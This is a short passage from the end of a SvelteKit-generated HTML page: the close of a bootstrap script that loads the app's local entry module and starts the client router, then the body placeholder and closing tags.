						import("../../../_app/immutable/entry/app.bdfa4db1.js")
					]).then(([kit, app]) => {
						kit.start(app, element, {
							node_ids: [0, 6],
							data,
							form: null,
							error: null
						});
					});
				}
			</script>
		
    <div style="display: contents">%sveltekit.body%</div>
  </body>
</html>
